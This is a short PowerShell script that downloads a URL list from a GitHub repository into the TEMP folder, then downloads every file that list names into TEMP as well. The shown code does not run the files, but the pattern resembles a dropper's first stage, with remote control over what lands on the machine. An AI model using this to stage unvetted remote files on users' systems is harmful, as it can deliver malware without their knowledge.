$url = "https://raw.githubusercontent.com/niffdy/webboot/master/lading.txt"
$ladingtxt = "$env:TEMP\lading.txt"
(New-Object System.Net.WebClient).DownloadFile($url, $ladingtxt)

ForEach ($line in (Get-Content $ladingtxt)) {
  # $line -replace "\d","x" | Out-File new.txt -Append
   $basefilename = Split-Path $line -Leaf
   $newcmdfile = "$env:TEMP\$basefilename"
   $newcmdfile
   Write-Host $line
   (New-Object System.Net.WebClient).DownloadFile($line, $newcmdfile)
   
}
